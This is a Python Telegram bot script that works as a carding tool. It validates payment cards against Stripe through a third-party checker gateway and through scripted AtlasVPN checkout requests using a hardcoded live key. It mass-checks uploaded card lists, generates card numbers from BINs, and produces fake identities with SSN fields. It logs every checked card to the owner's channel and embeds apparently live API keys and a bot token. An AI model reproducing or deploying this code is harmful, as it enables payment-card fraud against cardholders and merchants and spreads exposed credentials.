import os
import logging
import re
import time
import random
import requests
import asyncio
from pyrogram import Client, filters, idle
from pyrogram.types import Message
from pyrogram.enums import ChatAction, ParseMode

# === CONFIG ===
API_ID = 22118129
API_HASH = "43c66e3314921552d9330a4b05b18800"
BOT_TOKEN = "7252664374:AAG-DTJZN5WUQRTZd7yLrDCEIlrYZJ6xxGw"
GEMINI_API_KEY = "AIzaSyBcoZN2N2TKJeaWExZG9vT7hYU7K1--Tgw"
BOT_OWNER = "@andr0idpie9"
LOG_CHANNEL_ID = -1002843745742
GATEWAY_NAME = "Stripe Auth"
GATEWAY_URL_TEMPLATE = "https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={}"
BIN_API_URL = "https://bins.antipublic.cc/bins/{}"
CC_REGEX = r"/chk (\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4})"
OWNER_ID = 5203820046

# === Logging Setup ===
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

# === Initialize Bot ===
app = Client(
    "CombinedBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# === Ping Message ===
PING_MESSAGE = """
`⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤
⠀⠀⠀⠐⠋⠀⠀⠙⢿⣿⡆⠀⠀⣿⡇⠀⠀⠀⢸⣿⠀⠀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⣿⡇⠀⣠⣶⣾⣿⣿⣿⣿⡇
⣠⠴⣶⣤⣀⡀⠀⣠⣿⣿⠏⠀⠀⣿⡇⠀⣿⡏⢸⣿⠀⠀⣿⡇
⠀⠀⠈⠻⣿⣿⣟⠛⠋⠁⠀⠀⠀⣿⡇⠀⠹⣷⣼⣿⠀⠀⣿⡇
⠀⠀⠀⠀⠈⠻⣿⣷⣄⠀⠀⠀⠀⠿⠷⠀⠀⠉⠛⠉⠀⠀⠿⠿
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⢴⣦
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣦⣀⠀⠀⠀⠀⢀⣼⡏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣷⣶⣶⣶⣿⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠋⠉

⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤
⠀⠀⠀⠐⠋⠀⠀⠙⢿⣿⡆⠀⠀⣿⡇⠀⠀⠀⢸⣿⠀⠀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⣿⡇⠀⣠⣶⣾⣿⣿⣿⣿⡇
⣠⠴⣶⣤⣀⡀⠀⣠⣿⣿⠏⠀⠀⣿⡇⠀⣿⡏⢸⣿⠀⠀⣿⡇
⠀⠀⠈⠻⣿⣿⣟⠛⠋⠁⠀⠀⠀⣿⡇⠀⠹⣷⣼⣿⠀⠀⣿⡇
⠀⠀⠀⠀⠈⠻⣿⣷⣄⠀⠀⠀⠀⠿⠷⠀⠀⠉⠛⠉⠀⠀⠿⠿
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⢴⣦
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣦⣀⠀⠀⠀⠀⢀⣼⡏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣷⣶⣶⣶⣿⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠋⠉` 
"""

# === Background Task for Ping ===
async def ping_owner():
    while True:
        try:
            await app.send_message(OWNER_ID, PING_MESSAGE)
            logging.info("Ping message sent to owner")
        except Exception as e:
            logging.error(f"Failed to send ping: {e}")
        await asyncio.sleep(300)  # 5 minutes = 300 seconds

# === Gemini Flash API Function ===
def get_gemini_flash_response(prompt: str) -> str:
    url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"
    headers = {
        "Content-Type": "application/json",
        "X-goog-api-key": GEMINI_API_KEY
    }
    payload = {
        "contents": [
            {
                "parts": [{"text": prompt}]
            }
        ]
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        data = response.json()
        return data["candidates"][0]["content"]["parts"][0]["text"]
    except Exception as e:
        logging.error(f"Gemini API Error: {e}")
        return "⚠️SYSTEM PE LOAD HAI BHAI!"

# === Split long responses ===
def split_response(text: str, max_len=4000):
    parts = []
    while len(text) > max_len:
        split_at = text.rfind("\n", 0, max_len)
        if split_at == -1:
            split_at = max_len
        parts.append(text[:split_at])
        text = text[split_at:].lstrip()
    parts.append(text)
    return parts

# === BIN Info Function ===
def get_bin_info(bin_code):
    try:
        response = requests.get(BIN_API_URL.format(bin_code), timeout=10)
        if response.status_code != 200:
            return "Unknown", "Unknown", "N/A"

        data = response.json()
        brand = data.get("brand", "Unknown")
        bank = data.get("bank", "Unknown")
        country = data.get("country_name", "Unknown")
        flag = data.get("country_flag", "")

        return brand, bank, f"{country} {flag}" if country != "Unknown" else "N/A"

    except Exception as e:
        logging.error(f"BIN lookup error: {e}")
        return "Unknown", "Unknown", "N/A"

# === Generate CC Function ===
def generate_cc(bin_code, count=10):
    if count > 100:
        count = 100
    elif count < 1:
        count = 1
        
    cc_list = []
    for _ in range(count):
        # Generate random card number (bin + 10 digits)
        card_number = bin_code + ''.join([str(random.randint(0, 9)) for _ in range(10)])
        
        # Generate random expiry (month between 1-12, year between current year + 1 to +10)
        month = str(random.randint(1, 12)).zfill(2)
        year = str(random.randint(time.localtime().tm_year + 1, time.localtime().tm_year + 10))
        
        # Generate random 3-digit CVV
        cvv = str(random.randint(100, 999))
        
        cc_list.append(f"<code>{card_number}|{month}|{year}|{cvv}</code>")
    
    return cc_list

# === Log to Channel Function ===
async def log_to_channel(client: Client, log_type: str, message: Message, content: str, result: str = None):
    try:
        user = message.from_user
        user_info = f"[{user.first_name}](tg://user?id={user.id}) (`{user.id}`)"
        chat_type = message.chat.type.name
        
        if log_type == "AI":
            log_text = (
                f"📝 **New AI Prompt** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**Prompt:** `{content}`\n"
                f"**AI Response:**\n{result}"
            )
        elif log_type == "CC":
            log_text = (
                f"💳 **New CC Check** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**Card:** `{content}`\n"
                f"**Result:** {result}"
            )
        elif log_type == "GEN":
            log_text = (
                f"🔄 **New CC Generation** from {user_info}\n"
                f"**Chat Type:** `{chat_type}`\n"
                f"**BIN:** `{content}`\n"
                f"**Count:** {result}"
            )
        
        await client.send_message(LOG_CHANNEL_ID, log_text)
    except Exception as e:
        logging.warning(f"Failed to log message: {e}")

# === AI Handler ===
@app.on_message(filters.text & filters.command("ai", prefixes="/"))
async def ai_handler(client: Client, message: Message):
    user_input = message.text[len("/ai"):].strip()
    if not user_input:
        await message.reply("❗ Please provide a prompt after `/ai`.")
        return

    await client.send_chat_action(message.chat.id, ChatAction.TYPING)
    thinking_msg = await message.reply("🧠 *Thinking...*", quote=True)

    # Get AI response
    ai_response = get_gemini_flash_response(user_input)
    parts = split_response(ai_response)

    # Send response
    try:
        if len(parts) == 1:
            final_text = f"{parts[0]}\n\n✨ Powered by {BOT_OWNER}"
            await thinking_msg.edit(final_text)
        else:
            await thinking_msg.edit(parts[0])
            for part in parts[1:-1]:
                await message.reply(part)
            await message.reply(f"{parts[-1]}\n\n✨ Powered by {BOT_OWNER}")
    except Exception as e:
        logging.error(f"Edit/send failed: {e}")
        await message.reply("⚠️ Failed to send AI response.")

    # Log to channel
    await log_to_channel(client, "AI", message, user_input, ai_response)

# === CC Check Handler ===
@app.on_message(filters.text & filters.regex(CC_REGEX))
async def check_card(client: Client, message: Message):
    match = re.search(CC_REGEX, message.text)
    if not match:
        await message.reply("Invalid format. Use: `/chk xxxxxxxxxxxxxxxx|MM|YYYY|CVV`")
        return

    card = match.group(1)
    bin_code = card[:6]

    # Send initial "processing" message
    proc_msg = await message.reply_text(
        f"↯ Checking..\n\n"
        f"⌯ 𝐂𝐚𝐫𝐝 - <code>{card}</code>\n"
        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <code>{GATEWAY_NAME}</code>\n"
        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - Processing"
    )

    start_time = time.time()

    try:
        response = requests.get(GATEWAY_URL_TEMPLATE.format(card), timeout=60)
        elapsed = round(time.time() - start_time, 2)
        result_json = response.json()
        result_text = response.text.strip()

        if "declined" in result_text.lower():
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        else:
            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"

    except Exception as e:
        await proc_msg.edit(f"❌ Error: {e}")
        return

    brand, bank, country = get_bin_info(bin_code)

    final_msg = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{card}</code>\n"
        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <code>{GATEWAY_NAME}</code>\n"
        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <code>{result_text}</code>\n\n"
        f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
        f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
        f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
        f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
        f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
        f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
    )

    await proc_msg.edit(final_msg, parse_mode=ParseMode.HTML)
    
    # Log to channel
    await log_to_channel(client, "CC", message, card, status)

# === CC Generator Handler ===
@app.on_message(filters.command("gen", prefixes="/"))
async def generate_cc_handler(client: Client, message: Message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            await message.reply("❗ Please provide a BIN after <code>/gen</code>\nExample: <code>/gen 511253</code> or <code>/gen 511253 5</code>", parse_mode=ParseMode.HTML)
            return

        bin_code = parts[1]
        if not bin_code.isdigit() or len(bin_code) < 6:
            await message.reply("❗ Invalid BIN. Must be at least 6 digits.")
            return

        # Get count if provided
        count = 10  # default
        if len(parts) > 2:
            try:
                count = int(parts[2])
                if count > 1000:
                    count = 50
                    await message.reply("⚠️ Maximum count is 50. Generating 50 CCs.")
                elif count < 1:
                    count = 1
            except ValueError:
                await message.reply("❗ Invalid count. Using default 10 CCs.")

        # Show generating message
        proc_msg = await message.reply(f"🔹 Generating {count} CCs...")

        # Generate CCs
        cc_list = generate_cc(bin_code[:6], count)

        # Get BIN info
        brand, bank, country = get_bin_info(bin_code[:6])

        # Format response
        cc_text = "\n".join(cc_list)
        response_text = (
            f"<b>Generated {count} CCs 💳</b>\n\n"
            f"{cc_text}\n\n"
            f"<b>BIN-LOOKUP</b>\n"
            f"• BIN ➳ <code>{bin_code[:6]}</code>\n"
            f"• Country ➳ {country}\n"
            f"• Type ➳ {brand}\n"
            f"• Bank ➳ {bank}\n\n"
            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9"
        )

        await proc_msg.edit(response_text, parse_mode=ParseMode.HTML)
        
        # Log to channel
        await log_to_channel(client, "GEN", message, bin_code[:6], count)

    except Exception as e:
        logging.error(f"CC generation error: {e}")
        await message.reply(f"❌ Error generating CCs: {str(e)}")

# === Start Handler ===
@app.on_message(filters.command("start") & filters.private)
async def start_handler(client: Client, message: Message):
    welcome_msg = f"""
🌟 **Welcome to {GATEWAY_NAME} Bot** 🌟

⚡ **A Multi-Purpose Bot with Powerful Features:**

✓ **AI Assistant** - Get smart responses with `/ai <your query>`
✓ **CC Checker** - Validate cards with `/chk <card details>`
✓ **CC Generator** - Generate test cards with `/gen <BIN>`

🔹 **Example Commands:**
- `/ai explain quantum computing`
- `/chk 4111111111111111|12|2025|123`
- `/gen 511253 5` (generates 5 cards with BIN 511253)

📌 **Bot Features:**
- Fast and reliable
- Secure processing
- Detailed responses

👨‍💻 **Developer:** {BOT_OWNER}
🛠 **Support:** Contact dev for issues

🔥 **Start exploring by sending a command above!** 🔥
"""
    await message.reply(welcome_msg, parse_mode=ParseMode.MARKDOWN)

# === Startup Task ===
async def startup_task():
    # Start the ping task when bot starts
    asyncio.create_task(ping_owner())

# === Main Function ===
async def main():
    await app.start()
    await startup_task()
    await idle()
    
@app.on_message(filters.command("mgen", prefixes="/"))
async def mass_cc_generator(client: Client, message: Message):
    try:
        # Parse command arguments
        parts = message.text.split()
        if len(parts) < 2:
            await message.reply("❗ Please provide a BIN after `/mgen`\nExample: `/mgen 541174` or `/mgen 541174 500`")
            return

        bin_code = parts[1]
        if not bin_code.isdigit() or len(bin_code) < 6:
            await message.reply("❗ Invalid BIN. Must be at least 6 digits.")
            return

        # Get count if provided (default 100, max 10000)
        count = 100
        if len(parts) > 2:
            try:
                count = int(parts[2])
                if count > 10000:
                    count = 10000
                    await message.reply("⚠️ Maximum count is 10,000. Generating 10K CCs.")
                elif count < 1:
                    count = 100
            except ValueError:
                await message.reply("❗ Invalid count. Using default 100 CCs.")

        # Show generating message (will be deleted later)
        proc_msg = await message.reply(f"🔹 Generating {count} CCs via API... This may take a while for large counts.")

        # Call the API
        api_url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_code}&count={count}"
        response = requests.get(api_url, timeout=60)
        
        if response.status_code != 200:
            await proc_msg.edit(f"❌ API Error: Status code {response.status_code}")
            return

        cc_list = response.text.splitlines()
        if not cc_list:
            await proc_msg.edit("❌ No CCs generated. API returned empty response.")
            return

        # Get BIN info
        brand, bank, country = get_bin_info(bin_code[:6])

        # Create filename
        username = message.from_user.username or str(message.from_user.id)
        filename = f"ccgen_{bin_code[:6]}by@{username}.txt"

        # Prepare file content (just the CCs, no headers)
        file_content = "\n".join(cc_list)

        # Save to file
        with open(filename, "w") as f:
            f.write(file_content)

        # Prepare caption with BIN info
        caption = (
            f"Generated {count} CCs 💳\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"BIN ➳ {bin_code[:6]}\n"
            f"Country ➳ {country}\n"
            f"Type ➳ {brand}\n"
            f"Bank ➳ {bank}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )

        # Send document and delete processing message
        await message.reply_document(
            document=filename,
            caption=caption,
            quote=True
        )
        await proc_msg.delete()

        # Delete the file
        import os
        os.remove(filename)

    except Exception as e:
        # If there was an error but file was uploaded, don't show error
        if 'filename' in locals() and os.path.exists(filename):
            await proc_msg.delete()
        else:
            logging.error(f"Mass CC generation error: {e}")
            await message.reply(f"❌ Error generating CCs: {str(e)}")    
        
@app.on_message(filters.command("fake", prefixes="/"))
async def fake_identity_generator(client: Client, message: Message):
    try:
        # Default country is US if not specified
        country = "us"
        parts = message.text.split()
        if len(parts) > 1:
            country = parts[1].lower()

        # Show generating message
        proc_msg = await message.reply("🔹 Generating fake identity...")

        # Call the API
        api_url = f"https://randomuser.me/api/?nat={country}"
        response = requests.get(api_url, timeout=10)
        
        if response.status_code != 200:
            await proc_msg.edit(f"❌ API Error: Status code {response.status_code}")
            return

        data = response.json().get("results", [{}])[0]
        
        # Extract all possible fields with fallbacks
        name = f"{data.get('name', {}).get('first', 'Unknown')} {data.get('name', {}).get('last', 'Unknown')}"
        street = f"{data.get('location', {}).get('street', {}).get('number', '')} {data.get('location', {}).get('street', {}).get('name', 'Unknown')}"
        city = data.get('location', {}).get('city', 'Unknown')
        state = data.get('location', {}).get('state', 'Unknown')
        country_full = data.get('location', {}).get('country', 'Unknown')
        postcode = data.get('location', {}).get('postcode', 'Unknown')
        email = data.get('email', 'Unknown')
        phone = data.get('phone', 'Unknown')
        cell = data.get('cell', 'Unknown')
        dob = data.get('dob', {}).get('date', 'Unknown')[:10]  # Just the date part
        login = data.get('login', {})
        username = login.get('username', 'Unknown')
        password = login.get('password', 'Unknown')
        id_info = data.get('id', {})
        ssn = id_info.get('value', 'N/A')
        picture = data.get('picture', {}).get('large', 'N/A')

        # Format the response
        response_text = (
            f"┏━━━━━━━⍟\n"
            f"┃ Fake Identity \n"
            f"┗━━━━━━━━━━━⊛\n\n"
            f"✧ Name      ➳ `{name}`\n"
            f"✧ Street    ➳ `{street}`\n"
            f"✧ City      ➳ `{city}`\n"
            f"✧ State     ➳ `{state}`\n"
            f"✧ Country   ➳ `{country_full}`\n"
            f"✧ ZIP Code  ➳ `{postcode}`\n\n"
            f"✧ Email     ➳ `{email}`\n"
            f"✧ Phone     ➳ `{phone}`\n"
            f"✧ Mobile    ➳ `{cell}`\n"
            f"✧ DOB       ➳ `{dob}`\n\n"
            f"✧ Username  ➳ `{username}`\n"
            f"✧ Password  ➳ `{password}`\n\n"
            f"✧ SSN/ID    ➳ `{ssn}`\n"
            f"✧ Photo URL ➳ {picture}\n\n"
            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"
            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9"
        )

        await proc_msg.edit(response_text, parse_mode=ParseMode.MARKDOWN)

    except Exception as e:
        logging.error(f"Fake identity generation error: {e}")
        await message.reply(f"❌ Error generating fake identity: {str(e)}")
# Add this handler to your script
@app.on_message(filters.command("txtchk") & filters.reply)
async def txt_chk_handler(client: Client, message: Message):
    try:
        # Check if replied message has a document
        if not message.reply_to_message.document:
            await message.reply("❗ Please reply to a text file with `/txtchk`")
            return

        # Check if file is txt
        if not message.reply_to_message.document.file_name.endswith('.txt'):
            await message.reply("❗ Please reply to a .txt file")
            return

        # Send initial processing message
        proc_msg = await message.reply("↯ Processing your file, please wait...")

        # Download the file
        file_path = await message.reply_to_message.download()
        
        # Read the file
        with open(file_path, 'r') as f:
            cc_lines = f.read().splitlines()

        # Remove empty lines and validate CC format
        valid_ccs = []
        for line in cc_lines:
            line = line.strip()
            if re.match(r"\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4}", line):
                valid_ccs.append(line)

        total_ccs = len(valid_ccs)
        if total_ccs == 0:
            await proc_msg.edit("❌ No valid CCs found in the file.")
            os.remove(file_path)
            return

        # Initialize counters
        approved = 0
        declined = 0
        error = 0
        otp_required = 0
        start_time = time.time()
        last_update = time.time()
        
        # Prepare results list
        results = []
        results.append("Card Details                        | Status          | Response")
        results.append("------------------------------------|-----------------|-----------------")

        # Process each CC
        processed = 0
        for cc in valid_ccs:
            try:
                # Update progress every 5 seconds
                current_time = time.time()
                if current_time - last_update >= 5:
                    elapsed = current_time - start_time
                    eta = (elapsed / (processed + 1)) * (total_ccs - processed - 1)
                    
                    progress_msg = (
                        f"↯ Processing your file, please wait...\n\n"
                        f"✧ Total Cards: {total_ccs}\n"
                        f"✧ Checked: {processed}/{total_ccs}\n"
                        f"✧ Approved: {approved} ✅\n"
                        f"✧ Declined: {declined} ❌\n"
                        f"✧ OTP Required: {otp_required} 🔄\n"
                        f"✧ Errors: {error} ⚠️\n"
                        f"✧ ETA: {eta:.2f}s remaining"
                    )
                    
                    await proc_msg.edit(progress_msg)
                    last_update = current_time

                # Process the CC
                response = requests.get(GATEWAY_URL_TEMPLATE.format(cc), timeout=30)
                result_text = response.text.strip()
                status = "DECLINED ❌"
                
                if "declined" not in result_text.lower():
                    if "otp" in result_text.lower() or "3d" in result_text.lower():
                        status = "OTP REQUIRED 🔄"
                        otp_required += 1
                    else:
                        status = "APPROVED ✅"
                        approved += 1
                else:
                    declined += 1

                # Add to results
                results.append(f"{cc.ljust(35)}| {status.ljust(15)}| {result_text}")
                processed += 1

            except Exception as e:
                error += 1
                results.append(f"{cc.ljust(35)}| ERROR ⚠️       | {str(e)}")
                processed += 1
                continue

        # Final stats
        elapsed = time.time() - start_time
        
        # Save results to file
        username = message.from_user.username or str(message.from_user.id)
        result_filename = f"cc_check_results_{username}.txt"
        with open(result_filename, 'w') as f:
            f.write("\n".join(results))

        # Prepare caption
        caption = (
            f"─────── ⸙ ────────\n"
            f"↯ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n\n"
            f"✧ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀: {total_ccs}\n"
            f"✧ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 : {GATEWAY_NAME}\n"
            f"✧ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 : {approved} ✅\n"
            f"✧ 𝗢𝗧𝗣 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 : {otp_required} 🔄\n"
            f"✧ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {declined} ❌\n"
            f"✧ 𝗘𝗿𝗿𝗼𝗿: {error} ⚠️\n"
            f"✧ 𝗧𝗶𝗺𝗲: {elapsed:.2f}s\n\n"
            f"↯ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: @{username}\n"
            f"─────── ⸙ ────────"
        )

        # Send results and clean up
        await message.reply_document(
            document=result_filename,
            caption=caption,
            quote=True
        )
        await proc_msg.delete()
        
        # Clean up files
        os.remove(file_path)
        os.remove(result_filename)

        # Log to channel
        log_text = (
            f"📁 **Mass CC Check Completed**\n"
            f"**User:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\n"
            f"**File:** `{message.reply_to_message.document.file_name}`\n"
            f"**Total Cards:** {total_ccs}\n"
            f"**Approved:** {approved}\n"
            f"**Declined:** {declined}\n"
            f"**OTP Required:** {otp_required}\n"
            f"**Errors:** {error}\n"
            f"**Time Taken:** {elapsed:.2f}s"
        )
        await log_to_channel(client, "CC", message, f"File: {message.reply_to_message.document.file_name}", log_text)

    except Exception as e:
        logging.error(f"Mass CC check error: {e}")
        await message.reply(f"❌ Error processing file: {str(e)}")
        if 'proc_msg' in locals():
            await proc_msg.delete()
        if 'file_path' in locals() and os.path.exists(file_path):
            os.remove(file_path)
        if 'result_filename' in locals() and os.path.exists(result_filename):
            os.remove(result_filename)        
            
async def stripe_checker(cc, mes, ano, cvv, user_id, firstname):
    try:
        # Generate random user details
        zip_code = random.randint(10001, 90045)
        time_on_page = random.randint(30000, 699999)
        rand_num = random.randint(0, 99999)
        email = f"{random_string(7)}{rand_num}@gmail.com"
        first_name = random_string(7)
        last_name = random_string(7)
        
        # First request to get muid, sid, guid
        session = requests.Session()
        headers = {
            'Host': 'm.stripe.com',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://m.stripe.network',
            'Referer': 'https://m.stripe.network/inner.html'
        }
        
        # First request to get tokens
        res1 = session.get('https://m.stripe.com/6', headers=headers)
        muid = capture(res1.text, '"muid":"', '"')
        sid = capture(res1.text, '"sid":"', '"')
        guid = capture(res1.text, '"guid":"', '"')
        
        # Get BIN info
        bin_code = cc[:6]
        bin_info = get_bin_info(bin_code)
        
        # Prepare payment method request
        headers = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
        }
        
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'billing_details[address][postal_code]': zip_code,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/c478317df; stripe-js-v3/c478317df',
            'time_on_page': time_on_page,
            'referrer': 'https://atlasvpn.com/',
            'key': 'pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf'
        }
        
        # Make payment method request
        start_time = time.time()
        res2 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        elapsed = time.time() - start_time
        
        if 'error' in res2.text.lower():
            error_msg = capture(res2.text, '"message": "', '"')
            status = "Dead ❌"
            response = error_msg
        else:
            payment_id = capture(res2.text, '"id": "', '"')
            
            # Make payment request
            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                'Host': 'user.atlasvpn.com',
                'Origin': 'https://atlasvpn.com',
                'Referer': 'https://atlasvpn.com/',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
            }
            
            payload = {
                "email": email,
                "name": f"{first_name} {last_name}",
                "payment_method_id": payment_id,
                "identifier": "com.atlasvpn.vpn.subscription.p1m.stripe_regular_2",
                "currency": "USD",
                "postal_code": zip_code
            }
            
            res3 = session.post('https://user.atlasvpn.com/v1/stripe/pay', headers=headers, json=payload)
            
            if 'client_secret' in res3.text:
                status = "CVV or CCN ✅"
                response = "Approved"
            else:
                error_code = capture(res3.text, '"code":"', '"')
                status = "Dead ❌"
                response = error_code if error_code else "Declined"
        
        # Prepare response
        result_text = (
            f"<b>Card:</b> <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
            f"<b>Status -» {status}\n"
            f"Response -» {response}\n"
            f"Gateway -» Stripe Auth 1\n"
            f"Time -» <b>{elapsed:.2f}</b><b>s</b>\n\n"
            f"------- Bin Info -------</b>\n"
            f"<b>Bank -»</b> {bin_info[1]}\n"
            f"<b>Brand -»</b> {bin_info[0]}\n"
            f"<b>Type -»</b> {bin_info[2]}\n"
            f"<b>Currency -»</b> USD\n"
            f"<b>Country -»</b> {bin_info[3]}\n"
            f"<b>----------------------------</b>\n\n"
            f"<b>Checked By <a href='tg://user?id={user_id}'>{firstname}</a></b>\n"
            f"<b>Bot By: <a href='t.me/andr0idpie9'>ANDROID PIE</a></b>"
        )
        
        return result_text
        
    except Exception as e:
        logging.error(f"Stripe checker error: {e}")
        return f"Error processing card: {str(e)}"

def capture(text, start, end):
    try:
        return text.split(start)[1].split(end)[0]
    except:
        return ""

def random_string(length):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(length))

@app.on_message(filters.command("ss", prefixes="/"))
async def ss_handler(client: Client, message: Message):
    try:
        # Check if user provided CC
        if len(message.text.split()) < 2:
            await message.reply("<b>Please provide a CC to check in format: /ss 4111111111111111|12|25|123</b>", parse_mode="html")
            return
        
        # Parse CC details
        lista = message.text.split()[1]
        if not re.match(r"\d{16}\|\d{2}\|\d{2,4}\|\d{3}", lista):
            await message.reply("<b>Invalid CC format. Use: /ss 4111111111111111|12|25|123</b>", parse_mode="html")
            return
            
        parts = lista.split("|")
        cc = parts[0]
        mes = parts[1]
        ano = parts[2]
        cvv = parts[3]
        
        # Send initial processing message
        proc_msg = await message.reply("<b>Wait for Result...</b>", parse_mode="html")
        
        # Perform the check
        result = await stripe_checker(cc, mes, ano, cvv, message.from_user.id, message.from_user.first_name)
        
        # Edit message with result
        await proc_msg.edit(result, parse_mode="html", disable_web_page_preview=True)
        
        # Log to channel
        await log_to_channel(
            client, 
            "CC", 
            message, 
            lista, 
            "Approved" if "CVV or CCN ✅" in result else "Declined"
        )
        
    except Exception as e:
        logging.error(f"SS handler error: {e}")
        await message.reply(f"Error processing request: {str(e)}")            
        
if __name__ == "__main__":
    print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
